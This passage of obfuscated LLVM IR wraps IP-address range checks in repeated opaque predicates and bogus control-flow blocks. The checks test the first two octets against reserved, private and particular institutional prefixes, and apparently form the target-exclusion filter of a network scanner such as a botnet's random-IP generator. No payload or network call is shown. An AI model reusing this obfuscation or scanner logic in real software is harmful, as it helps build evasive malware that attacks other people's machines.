  %479 = load i32, i32* @x.65
  %480 = load i32, i32* @y.66
  %481 = sub i32 %479, 1
  %482 = mul i32 %479, %481
  %483 = urem i32 %482, 2
  %484 = icmp eq i32 %483, 0
  %485 = icmp slt i32 %480, 10
  %486 = or i1 %484, %485
  br i1 %486, label %originalBB54, label %originalBB54alteredBB

originalBB54:                                     ; preds = %originalBB54alteredBB, %478
  %487 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %488 = zext i8 %487 to i32
  %489 = icmp eq i32 %488, 217
  %490 = load i32, i32* @x.65
  %491 = load i32, i32* @y.66
  %492 = sub i32 %490, 1
  %493 = mul i32 %490, %492
  %494 = urem i32 %493, 2
  %495 = icmp eq i32 %494, 0
  %496 = icmp slt i32 %491, 10
  %497 = or i1 %495, %496
  br i1 %497, label %originalBBpart256, label %originalBB54alteredBB

originalBBpart256:                                ; preds = %originalBB54
  br i1 %489, label %5298, label %498

; <label>:498:                                    ; preds = %originalBBpart256, %474
  %499 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %500 = zext i8 %499 to i32
  %501 = icmp eq i32 %500, 161
  br i1 %501, label %502, label %522

; <label>:502:                                    ; preds = %498
  %503 = load i32, i32* @x.65
  %504 = load i32, i32* @y.66
  %505 = sub i32 %503, 1
  %506 = mul i32 %503, %505
  %507 = urem i32 %506, 2
  %508 = icmp eq i32 %507, 0
  %509 = icmp slt i32 %504, 10
  %510 = or i1 %508, %509
  br i1 %510, label %originalBB58, label %originalBB58alteredBB

originalBB58:                                     ; preds = %originalBB58alteredBB, %502
  %511 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %512 = zext i8 %511 to i32
  %513 = icmp eq i32 %512, 124
  %514 = load i32, i32* @x.65
  %515 = load i32, i32* @y.66
  %516 = sub i32 %514, 1
  %517 = mul i32 %514, %516
  %518 = urem i32 %517, 2
  %519 = icmp eq i32 %518, 0
  %520 = icmp slt i32 %515, 10
  %521 = or i1 %519, %520
  br i1 %521, label %originalBBpart260, label %originalBB58alteredBB

originalBBpart260:                                ; preds = %originalBB58
  br i1 %513, label %5298, label %522

; <label>:522:                                    ; preds = %originalBBpart260, %498
  %523 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %524 = zext i8 %523 to i32
  %525 = icmp eq i32 %524, 162
  br i1 %525, label %526, label %530

; <label>:526:                                    ; preds = %522
  %527 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %528 = zext i8 %527 to i32
  %529 = icmp eq i32 %528, 32
  br i1 %529, label %5298, label %530

; <label>:530:                                    ; preds = %526, %522
  %531 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %532 = zext i8 %531 to i32
  %533 = icmp eq i32 %532, 155
  br i1 %533, label %534, label %554

; <label>:534:                                    ; preds = %530
  %535 = load i32, i32* @x.65
  %536 = load i32, i32* @y.66
  %537 = sub i32 %535, 1
  %538 = mul i32 %535, %537
  %539 = urem i32 %538, 2
  %540 = icmp eq i32 %539, 0
  %541 = icmp slt i32 %536, 10
  %542 = or i1 %540, %541
  br i1 %542, label %originalBB62, label %originalBB62alteredBB

originalBB62:                                     ; preds = %originalBB62alteredBB, %534
  %543 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %544 = zext i8 %543 to i32
  %545 = icmp eq i32 %544, 96
  %546 = load i32, i32* @x.65
  %547 = load i32, i32* @y.66
  %548 = sub i32 %546, 1
  %549 = mul i32 %546, %548
  %550 = urem i32 %549, 2
  %551 = icmp eq i32 %550, 0
  %552 = icmp slt i32 %547, 10
  %553 = or i1 %551, %552
  br i1 %553, label %originalBBpart264, label %originalBB62alteredBB

originalBBpart264:                                ; preds = %originalBB62
  br i1 %545, label %5298, label %554

; <label>:554:                                    ; preds = %originalBBpart264, %530
  %555 = load i32, i32* @x.65
  %556 = load i32, i32* @y.66
  %557 = sub i32 %555, 1
  %558 = mul i32 %555, %557
  %559 = urem i32 %558, 2
  %560 = icmp eq i32 %559, 0
  %561 = icmp slt i32 %556, 10
  %562 = or i1 %560, %561
  br i1 %562, label %originalBB66, label %originalBB66alteredBB

originalBB66:                                     ; preds = %originalBB66alteredBB, %554
  %563 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %564 = zext i8 %563 to i32
  %565 = icmp eq i32 %564, 155
  %566 = load i32, i32* @x.65
  %567 = load i32, i32* @y.66
  %568 = sub i32 %566, 1
  %569 = mul i32 %566, %568
  %570 = urem i32 %569, 2
  %571 = icmp eq i32 %570, 0
  %572 = icmp slt i32 %567, 10
  %573 = or i1 %571, %572
  br i1 %573, label %originalBBpart268, label %originalBB66alteredBB

originalBBpart268:                                ; preds = %originalBB66
  br i1 %565, label %574, label %578

; <label>:574:                                    ; preds = %originalBBpart268
  %575 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %576 = zext i8 %575 to i32
  %577 = icmp eq i32 %576, 149
  br i1 %577, label %5298, label %578

; <label>:578:                                    ; preds = %574, %originalBBpart268
  %579 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %580 = zext i8 %579 to i32
  %581 = icmp eq i32 %580, 155
  br i1 %581, label %582, label %586

; <label>:582:                                    ; preds = %578
  %583 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %584 = zext i8 %583 to i32
  %585 = icmp eq i32 %584, 155
  br i1 %585, label %5298, label %586

; <label>:586:                                    ; preds = %582, %578
  %587 = load i32, i32* @x.65
  %588 = load i32, i32* @y.66
  %589 = sub i32 %587, 1
  %590 = mul i32 %587, %589
  %591 = urem i32 %590, 2
  %592 = icmp eq i32 %591, 0
  %593 = icmp slt i32 %588, 10
  %594 = or i1 %592, %593
  br i1 %594, label %originalBB70, label %originalBB70alteredBB

originalBB70:                                     ; preds = %originalBB70alteredBB, %586
  %595 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %596 = zext i8 %595 to i32
  %597 = icmp eq i32 %596, 155
  %598 = load i32, i32* @x.65
  %599 = load i32, i32* @y.66
  %600 = sub i32 %598, 1
  %601 = mul i32 %598, %600
  %602 = urem i32 %601, 2
  %603 = icmp eq i32 %602, 0
  %604 = icmp slt i32 %599, 10
  %605 = or i1 %603, %604
  br i1 %605, label %originalBBpart272, label %originalBB70alteredBB

originalBBpart272:                                ; preds = %originalBB70
  br i1 %597, label %606, label %610

; <label>:606:                                    ; preds = %originalBBpart272
  %607 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %608 = zext i8 %607 to i32
  %609 = icmp eq i32 %608, 178
  br i1 %609, label %5298, label %610

; <label>:610:                                    ; preds = %606, %originalBBpart272
  %611 = load i32, i32* @x.65
  %612 = load i32, i32* @y.66
  %613 = sub i32 %611, 1
  %614 = mul i32 %611, %613
  %615 = urem i32 %614, 2
  %616 = icmp eq i32 %615, 0
  %617 = icmp slt i32 %612, 10
  %618 = or i1 %616, %617
  br i1 %618, label %originalBB74, label %originalBB74alteredBB

originalBB74:                                     ; preds = %originalBB74alteredBB, %610
  %619 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %620 = zext i8 %619 to i32
  %621 = icmp eq i32 %620, 164
  %622 = load i32, i32* @x.65
  %623 = load i32, i32* @y.66
  %624 = sub i32 %622, 1
  %625 = mul i32 %622, %624
  %626 = urem i32 %625, 2
  %627 = icmp eq i32 %626, 0
  %628 = icmp slt i32 %623, 10
  %629 = or i1 %627, %628
  br i1 %629, label %originalBBpart276, label %originalBB74alteredBB

originalBBpart276:                                ; preds = %originalBB74
  br i1 %621, label %630, label %634

; <label>:630:                                    ; preds = %originalBBpart276
  %631 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %632 = zext i8 %631 to i32
  %633 = icmp eq i32 %632, 158
  br i1 %633, label %5298, label %634

; <label>:634:                                    ; preds = %630, %originalBBpart276
  %635 = load i32, i32* @x.65
  %636 = load i32, i32* @y.66
  %637 = sub i32 %635, 1
  %638 = mul i32 %635, %637
  %639 = urem i32 %638, 2
  %640 = icmp eq i32 %639, 0
  %641 = icmp slt i32 %636, 10
  %642 = or i1 %640, %641
  br i1 %642, label %originalBB78, label %originalBB78alteredBB

originalBB78:                                     ; preds = %originalBB78alteredBB, %634
  %643 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %644 = zext i8 %643 to i32
  %645 = icmp eq i32 %644, 156
  %646 = load i32, i32* @x.65
  %647 = load i32, i32* @y.66
  %648 = sub i32 %646, 1
  %649 = mul i32 %646, %648
  %650 = urem i32 %649, 2
  %651 = icmp eq i32 %650, 0
  %652 = icmp slt i32 %647, 10
  %653 = or i1 %651, %652
  br i1 %653, label %originalBBpart280, label %originalBB78alteredBB

originalBBpart280:                                ; preds = %originalBB78
  br i1 %645, label %654, label %658

; <label>:654:                                    ; preds = %originalBBpart280
  %655 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %656 = zext i8 %655 to i32
  %657 = icmp eq i32 %656, 9
  br i1 %657, label %5298, label %658

; <label>:658:                                    ; preds = %654, %originalBBpart280
  %659 = load i32, i32* @x.65
  %660 = load i32, i32* @y.66
  %661 = sub i32 %659, 1
  %662 = mul i32 %659, %661
  %663 = urem i32 %662, 2
  %664 = icmp eq i32 %663, 0
  %665 = icmp slt i32 %660, 10
  %666 = or i1 %664, %665
  br i1 %666, label %originalBB82, label %originalBB82alteredBB

originalBB82:                                     ; preds = %originalBB82alteredBB, %658
  %667 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %668 = zext i8 %667 to i32
  %669 = icmp eq i32 %668, 167
  %670 = load i32, i32* @x.65
  %671 = load i32, i32* @y.66
  %672 = sub i32 %670, 1
  %673 = mul i32 %670, %672
  %674 = urem i32 %673, 2
  %675 = icmp eq i32 %674, 0
  %676 = icmp slt i32 %671, 10
  %677 = or i1 %675, %676
  br i1 %677, label %originalBBpart284, label %originalBB82alteredBB

originalBBpart284:                                ; preds = %originalBB82
  br i1 %669, label %678, label %698

; <label>:678:                                    ; preds = %originalBBpart284
  %679 = load i32, i32* @x.65
  %680 = load i32, i32* @y.66
  %681 = sub i32 %679, 1
  %682 = mul i32 %679, %681
  %683 = urem i32 %682, 2
  %684 = icmp eq i32 %683, 0
  %685 = icmp slt i32 %680, 10
  %686 = or i1 %684, %685
  br i1 %686, label %originalBB86, label %originalBB86alteredBB

originalBB86:                                     ; preds = %originalBB86alteredBB, %678
  %687 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %688 = zext i8 %687 to i32
  %689 = icmp eq i32 %688, 44
  %690 = load i32, i32* @x.65
  %691 = load i32, i32* @y.66
  %692 = sub i32 %690, 1
  %693 = mul i32 %690, %692
  %694 = urem i32 %693, 2
  %695 = icmp eq i32 %694, 0
  %696 = icmp slt i32 %691, 10
  %697 = or i1 %695, %696
  br i1 %697, label %originalBBpart288, label %originalBB86alteredBB

originalBBpart288:                                ; preds = %originalBB86
  br i1 %689, label %5298, label %698

; <label>:698:                                    ; preds = %originalBBpart288, %originalBBpart284
  %699 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %700 = zext i8 %699 to i32
  %701 = icmp eq i32 %700, 168
  br i1 %701, label %702, label %706

; <label>:702:                                    ; preds = %698
  %703 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %704 = zext i8 %703 to i32
  %705 = icmp eq i32 %704, 68
  br i1 %705, label %5298, label %706

; <label>:706:                                    ; preds = %702, %698
  %707 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %708 = zext i8 %707 to i32
  %709 = icmp eq i32 %708, 168
  br i1 %709, label %710, label %730

; <label>:710:                                    ; preds = %706
  %711 = load i32, i32* @x.65
  %712 = load i32, i32* @y.66
  %713 = sub i32 %711, 1
  %714 = mul i32 %711, %713
  %715 = urem i32 %714, 2
  %716 = icmp eq i32 %715, 0
  %717 = icmp slt i32 %712, 10
  %718 = or i1 %716, %717
  br i1 %718, label %originalBB90, label %originalBB90alteredBB

originalBB90:                                     ; preds = %originalBB90alteredBB, %710
  %719 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %720 = zext i8 %719 to i32
  %721 = icmp eq i32 %720, 85
  %722 = load i32, i32* @x.65
  %723 = load i32, i32* @y.66
  %724 = sub i32 %722, 1
  %725 = mul i32 %722, %724
  %726 = urem i32 %725, 2
  %727 = icmp eq i32 %726, 0
  %728 = icmp slt i32 %723, 10
  %729 = or i1 %727, %728
  br i1 %729, label %originalBBpart292, label %originalBB90alteredBB

originalBBpart292:                                ; preds = %originalBB90
  br i1 %721, label %5298, label %730

; <label>:730:                                    ; preds = %originalBBpart292, %706
  %731 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %732 = zext i8 %731 to i32
  %733 = icmp eq i32 %732, 168
  br i1 %733, label %734, label %738

; <label>:734:                                    ; preds = %730
  %735 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %736 = zext i8 %735 to i32
  %737 = icmp eq i32 %736, 102
  br i1 %737, label %5298, label %738

; <label>:738:                                    ; preds = %734, %730
  %739 = load i32, i32* @x.65
  %740 = load i32, i32* @y.66
  %741 = sub i32 %739, 1
  %742 = mul i32 %739, %741
  %743 = urem i32 %742, 2
  %744 = icmp eq i32 %743, 0
  %745 = icmp slt i32 %740, 10
  %746 = or i1 %744, %745
  br i1 %746, label %originalBB94, label %originalBB94alteredBB

originalBB94:                                     ; preds = %originalBB94alteredBB, %738
  %747 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %748 = zext i8 %747 to i32
  %749 = icmp eq i32 %748, 203
  %750 = load i32, i32* @x.65
  %751 = load i32, i32* @y.66
  %752 = sub i32 %750, 1
  %753 = mul i32 %750, %752
  %754 = urem i32 %753, 2
  %755 = icmp eq i32 %754, 0
  %756 = icmp slt i32 %751, 10
  %757 = or i1 %755, %756
  br i1 %757, label %originalBBpart296, label %originalBB94alteredBB

originalBBpart296:                                ; preds = %originalBB94
  br i1 %749, label %758, label %762

; <label>:758:                                    ; preds = %originalBBpart296
  %759 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %760 = zext i8 %759 to i32
  %761 = icmp eq i32 %760, 59
  br i1 %761, label %5298, label %762

; <label>:762:                                    ; preds = %758, %originalBBpart296
  %763 = load i32, i32* @x.65
  %764 = load i32, i32* @y.66
  %765 = sub i32 %763, 1
  %766 = mul i32 %763, %765
  %767 = urem i32 %766, 2
  %768 = icmp eq i32 %767, 0
  %769 = icmp slt i32 %764, 10
  %770 = or i1 %768, %769
  br i1 %770, label %originalBB98, label %originalBB98alteredBB

originalBB98:                                     ; preds = %originalBB98alteredBB, %762
  %771 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %772 = zext i8 %771 to i32
  %773 = icmp eq i32 %772, 204
  %774 = load i32, i32* @x.65
  %775 = load i32, i32* @y.66
  %776 = sub i32 %774, 1
  %777 = mul i32 %774, %776
  %778 = urem i32 %777, 2
  %779 = icmp eq i32 %778, 0
  %780 = icmp slt i32 %775, 10
  %781 = or i1 %779, %780
  br i1 %781, label %originalBBpart2100, label %originalBB98alteredBB

originalBBpart2100:                               ; preds = %originalBB98
  br i1 %773, label %782, label %786

; <label>:782:                                    ; preds = %originalBBpart2100
  %783 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %784 = zext i8 %783 to i32
  %785 = icmp eq i32 %784, 34
  br i1 %785, label %5298, label %786

; <label>:786:                                    ; preds = %782, %originalBBpart2100
  %787 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %788 = zext i8 %787 to i32
  %789 = icmp eq i32 %788, 207
  br i1 %789, label %790, label %810

; <label>:790:                                    ; preds = %786
  %791 = load i32, i32* @x.65
  %792 = load i32, i32* @y.66
  %793 = sub i32 %791, 1
  %794 = mul i32 %791, %793
  %795 = urem i32 %794, 2
  %796 = icmp eq i32 %795, 0
  %797 = icmp slt i32 %792, 10
  %798 = or i1 %796, %797
  br i1 %798, label %originalBB102, label %originalBB102alteredBB

originalBB102:                                    ; preds = %originalBB102alteredBB, %790
  %799 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %800 = zext i8 %799 to i32
  %801 = icmp eq i32 %800, 30
  %802 = load i32, i32* @x.65
  %803 = load i32, i32* @y.66
  %804 = sub i32 %802, 1
  %805 = mul i32 %802, %804
  %806 = urem i32 %805, 2
  %807 = icmp eq i32 %806, 0
  %808 = icmp slt i32 %803, 10
  %809 = or i1 %807, %808
  br i1 %809, label %originalBBpart2104, label %originalBB102alteredBB

originalBBpart2104:                               ; preds = %originalBB102
  br i1 %801, label %5298, label %810

; <label>:810:                                    ; preds = %originalBBpart2104, %786
  %811 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %812 = zext i8 %811 to i32
  %813 = icmp eq i32 %812, 117
  br i1 %813, label %814, label %818

; <label>:814:                                    ; preds = %810
  %815 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %816 = zext i8 %815 to i32
  %817 = icmp eq i32 %816, 55
  br i1 %817, label %5298, label %818

; <label>:818:                                    ; preds = %814, %810
  %819 = load i32, i32* @x.65
  %820 = load i32, i32* @y.66
  %821 = sub i32 %819, 1
  %822 = mul i32 %819, %821
  %823 = urem i32 %822, 2
  %824 = icmp eq i32 %823, 0
  %825 = icmp slt i32 %820, 10
  %826 = or i1 %824, %825
  br i1 %826, label %originalBB106, label %originalBB106alteredBB

originalBB106:                                    ; preds = %originalBB106alteredBB, %818
  %827 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %828 = zext i8 %827 to i32
  %829 = icmp eq i32 %828, 117
  %830 = load i32, i32* @x.65
  %831 = load i32, i32* @y.66
  %832 = sub i32 %830, 1
  %833 = mul i32 %830, %832
  %834 = urem i32 %833, 2
  %835 = icmp eq i32 %834, 0
  %836 = icmp slt i32 %831, 10
  %837 = or i1 %835, %836
  br i1 %837, label %originalBBpart2108, label %originalBB106alteredBB

originalBBpart2108:                               ; preds = %originalBB106
  br i1 %829, label %838, label %842

; <label>:838:                                    ; preds = %originalBBpart2108
  %839 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %840 = zext i8 %839 to i32
  %841 = icmp eq i32 %840, 56
  br i1 %841, label %5298, label %842

; <label>:842:                                    ; preds = %838, %originalBBpart2108
  %843 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %844 = zext i8 %843 to i32
  %845 = icmp eq i32 %844, 80
  br i1 %845, label %846, label %850

; <label>:846:                                    ; preds = %842
  %847 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %848 = zext i8 %847 to i32
  %849 = icmp eq i32 %848, 235
  br i1 %849, label %5298, label %850

; <label>:850:                                    ; preds = %846, %842
  %851 = load i32, i32* @x.65
  %852 = load i32, i32* @y.66
  %853 = sub i32 %851, 1
  %854 = mul i32 %851, %853
  %855 = urem i32 %854, 2
  %856 = icmp eq i32 %855, 0
  %857 = icmp slt i32 %852, 10
  %858 = or i1 %856, %857
  br i1 %858, label %originalBB110, label %originalBB110alteredBB

originalBB110:                                    ; preds = %originalBB110alteredBB, %850
  %859 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %860 = zext i8 %859 to i32
  %861 = icmp eq i32 %860, 207
  %862 = load i32, i32* @x.65
  %863 = load i32, i32* @y.66
  %864 = sub i32 %862, 1
  %865 = mul i32 %862, %864
  %866 = urem i32 %865, 2
  %867 = icmp eq i32 %866, 0
  %868 = icmp slt i32 %863, 10
  %869 = or i1 %867, %868
  br i1 %869, label %originalBBpart2112, label %originalBB110alteredBB

originalBBpart2112:                               ; preds = %originalBB110
  br i1 %861, label %870, label %874

; <label>:870:                                    ; preds = %originalBBpart2112
  %871 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %872 = zext i8 %871 to i32
  %873 = icmp eq i32 %872, 120
  br i1 %873, label %5298, label %874

; <label>:874:                                    ; preds = %870, %originalBBpart2112
  %875 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %876 = zext i8 %875 to i32
  %877 = icmp eq i32 %876, 209
  br i1 %877, label %878, label %882

; <label>:878:                                    ; preds = %874
  %879 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %880 = zext i8 %879 to i32
  %881 = icmp eq i32 %880, 35
  br i1 %881, label %5298, label %882

; <label>:882:                                    ; preds = %878, %874
  %883 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %884 = zext i8 %883 to i32
  %885 = icmp eq i32 %884, 64
  br i1 %885, label %886, label %890

; <label>:886:                                    ; preds = %882
  %887 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %888 = zext i8 %887 to i32
  %889 = icmp eq i32 %888, 70
  br i1 %889, label %5298, label %890

; <label>:890:                                    ; preds = %886, %882
  %891 = load i32, i32* @x.65
  %892 = load i32, i32* @y.66
  %893 = sub i32 %891, 1
  %894 = mul i32 %891, %893
  %895 = urem i32 %894, 2
  %896 = icmp eq i32 %895, 0
  %897 = icmp slt i32 %892, 10
  %898 = or i1 %896, %897
  br i1 %898, label %originalBB114, label %originalBB114alteredBB

originalBB114:                                    ; preds = %originalBB114alteredBB, %890
  %899 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %900 = zext i8 %899 to i32
  %901 = icmp eq i32 %900, 172
  %902 = load i32, i32* @x.65
  %903 = load i32, i32* @y.66
  %904 = sub i32 %902, 1
  %905 = mul i32 %902, %904
  %906 = urem i32 %905, 2
  %907 = icmp eq i32 %906, 0
  %908 = icmp slt i32 %903, 10
  %909 = or i1 %907, %908
  br i1 %909, label %originalBBpart2116, label %originalBB114alteredBB

originalBBpart2116:                               ; preds = %originalBB114
  br i1 %901, label %910, label %934

; <label>:910:                                    ; preds = %originalBBpart2116
  %911 = load i32, i32* @x.65
  %912 = load i32, i32* @y.66
  %913 = sub i32 %911, 1
  %914 = mul i32 %911, %913
  %915 = urem i32 %914, 2
  %916 = icmp eq i32 %915, 0
  %917 = icmp slt i32 %912, 10
  %918 = or i1 %916, %917
  br i1 %918, label %originalBB118, label %originalBB118alteredBB

originalBB118:                                    ; preds = %originalBB118alteredBB, %910
  %919 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %920 = zext i8 %919 to i32
  %921 = icmp sge i32 %920, 16
  %922 = load i32, i32* @x.65
  %923 = load i32, i32* @y.66
  %924 = sub i32 %922, 1
  %925 = mul i32 %922, %924
  %926 = urem i32 %925, 2
  %927 = icmp eq i32 %926, 0
  %928 = icmp slt i32 %923, 10
  %929 = or i1 %927, %928
  br i1 %929, label %originalBBpart2120, label %originalBB118alteredBB

originalBBpart2120:                               ; preds = %originalBB118
  br i1 %921, label %930, label %934

; <label>:930:                                    ; preds = %originalBBpart2120
  %931 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %932 = zext i8 %931 to i32
  %933 = icmp slt i32 %932, 32
  br i1 %933, label %5298, label %934

; <label>:934:                                    ; preds = %930, %originalBBpart2120, %originalBBpart2116
  %935 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %936 = zext i8 %935 to i32
  %937 = icmp eq i32 %936, 100
  br i1 %937, label %938, label %962

; <label>:938:                                    ; preds = %934
  %939 = load i32, i32* @x.65
  %940 = load i32, i32* @y.66
  %941 = sub i32 %939, 1
  %942 = mul i32 %939, %941
  %943 = urem i32 %942, 2
  %944 = icmp eq i32 %943, 0
  %945 = icmp slt i32 %940, 10
  %946 = or i1 %944, %945
  br i1 %946, label %originalBB122, label %originalBB122alteredBB

originalBB122:                                    ; preds = %originalBB122alteredBB, %938
  %947 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %948 = zext i8 %947 to i32
  %949 = icmp sge i32 %948, 64
  %950 = load i32, i32* @x.65
  %951 = load i32, i32* @y.66
  %952 = sub i32 %950, 1
  %953 = mul i32 %950, %952
  %954 = urem i32 %953, 2
  %955 = icmp eq i32 %954, 0
  %956 = icmp slt i32 %951, 10
  %957 = or i1 %955, %956
  br i1 %957, label %originalBBpart2124, label %originalBB122alteredBB

originalBBpart2124:                               ; preds = %originalBB122
  br i1 %949, label %958, label %962

; <label>:958:                                    ; preds = %originalBBpart2124
  %959 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %960 = zext i8 %959 to i32
  %961 = icmp slt i32 %960, 127
  br i1 %961, label %5298, label %962

; <label>:962:                                    ; preds = %958, %originalBBpart2124, %934
  %963 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %964 = zext i8 %963 to i32
  %965 = icmp eq i32 %964, 169
  br i1 %965, label %966, label %986

; <label>:966:                                    ; preds = %962
  %967 = load i32, i32* @x.65
  %968 = load i32, i32* @y.66
  %969 = sub i32 %967, 1
  %970 = mul i32 %967, %969
  %971 = urem i32 %970, 2
  %972 = icmp eq i32 %971, 0
  %973 = icmp slt i32 %968, 10
  %974 = or i1 %972, %973
  br i1 %974, label %originalBB126, label %originalBB126alteredBB

originalBB126:                                    ; preds = %originalBB126alteredBB, %966
  %975 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %976 = zext i8 %975 to i32
  %977 = icmp eq i32 %976, 254
  %978 = load i32, i32* @x.65
  %979 = load i32, i32* @y.66
  %980 = sub i32 %978, 1
  %981 = mul i32 %978, %980
  %982 = urem i32 %981, 2
  %983 = icmp eq i32 %982, 0
  %984 = icmp slt i32 %979, 10
  %985 = or i1 %983, %984
  br i1 %985, label %originalBBpart2128, label %originalBB126alteredBB

originalBBpart2128:                               ; preds = %originalBB126
  br i1 %977, label %5298, label %986

; <label>:986:                                    ; preds = %originalBBpart2128, %962
  %987 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %988 = zext i8 %987 to i32
  %989 = icmp eq i32 %988, 198
  br i1 %989, label %990, label %1030

; <label>:990:                                    ; preds = %986
  %991 = load i32, i32* @x.65
  %992 = load i32, i32* @y.66
  %993 = sub i32 %991, 1
  %994 = mul i32 %991, %993
  %995 = urem i32 %994, 2
  %996 = icmp eq i32 %995, 0
  %997 = icmp slt i32 %992, 10
  %998 = or i1 %996, %997
  br i1 %998, label %originalBB130, label %originalBB130alteredBB

originalBB130:                                    ; preds = %originalBB130alteredBB, %990
  %999 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1000 = zext i8 %999 to i32
  %1001 = icmp sge i32 %1000, 18
  %1002 = load i32, i32* @x.65
  %1003 = load i32, i32* @y.66
  %1004 = sub i32 %1002, 1
  %1005 = mul i32 %1002, %1004
  %1006 = urem i32 %1005, 2
  %1007 = icmp eq i32 %1006, 0
  %1008 = icmp slt i32 %1003, 10
  %1009 = or i1 %1007, %1008
  br i1 %1009, label %originalBBpart2132, label %originalBB130alteredBB

originalBBpart2132:                               ; preds = %originalBB130
  br i1 %1001, label %1010, label %1030

; <label>:1010:                                   ; preds = %originalBBpart2132
  %1011 = load i32, i32* @x.65
  %1012 = load i32, i32* @y.66
  %1013 = sub i32 %1011, 1
  %1014 = mul i32 %1011, %1013
  %1015 = urem i32 %1014, 2
  %1016 = icmp eq i32 %1015, 0
  %1017 = icmp slt i32 %1012, 10
